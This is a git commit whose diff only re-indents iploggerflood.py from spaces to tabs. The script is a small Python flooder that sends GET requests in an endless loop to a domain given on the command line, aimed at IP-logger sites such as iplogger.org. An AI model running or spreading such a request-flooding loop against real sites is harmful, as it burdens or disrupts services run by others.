f0d87437bb4a97f4eded822b9eccf33045daf38b
sc39 <44244999+sc39IsADev@users.noreply.github.com>
2020-12-28 14:57:39 -0500

    I hate spaces instead of tabs.

--- iploggerflood.py
+++ iploggerflood.py
@@ -3,37 +3,37 @@ import sys
 import os
 count = 0
 def help():
-  help = str('''
-  IP LOGGER FLOODER - qolhf
-  
-  ARGUMENTS MARKED WITH * ARE REQUIRED!
-  
-  DOCS:
-  
-  --help: DISPLAYS THIS MESSAGE 
-  --domain: DOMAIN TO SEND REQUESTS TO (*)
-  
-  Example: python3 iploggerflood.py --domain https://iplogger.org
-  ''')
-  print(help)
-  sys.exit()
+	help = str('''
+	IP LOGGER FLOODER - qolhf
+	
+	ARGUMENTS MARKED WITH * ARE REQUIRED!
+	
+	DOCS:
+	
+	--help: DISPLAYS THIS MESSAGE 
+	--domain: DOMAIN TO SEND REQUESTS TO (*)
+	
+	Example: python3 iploggerflood.py --domain https://iplogger.org
+	''')
+	print(help)
+	sys.exit()
 
 if len(sys.argv) == 1:
-  help()
+	help()
 elif len(sys.argv) == 2:
-  help()
+	help()
 elif len(sys.argv) == 3:
-  site = sys.argv[2]
-  if "help" in sys.argv:
-    help()
-    sys.exit()
-  elif "--domain" in sys.argv:
-    while True:
-      site = sys.argv[2]
-      headers = {
-        'User-Agent': 'SymIPLoggerFlooder/1.0 (Compatable With Linux/Windows) UsingPyRequests/:) (Block Agent/IP If Abusing) {Tool Made by qolhf} {Symphanny On Top}',
-      }
-      r = requests.get(site, headers=headers)
-      print("Sent request to {} and got code {}!".format(site, r.status_code))
-  else:
-    help()
+	site = sys.argv[2]
+	if "help" in sys.argv:
+		help()
+		sys.exit()
+	elif "--domain" in sys.argv:
+		while True:
+			site = sys.argv[2]
+			headers = {
+				'User-Agent': 'SymIPLoggerFlooder/1.0 (Compatable With Linux/Windows) UsingPyRequests/:) (Block Agent/IP If Abusing) {Tool Made by qolhf} {Symphanny On Top}',
+			}
+			r = requests.get(site, headers=headers)
+			print("Sent request to {} and got code {}!".format(site, r.status_code))
+	else:
+		help()
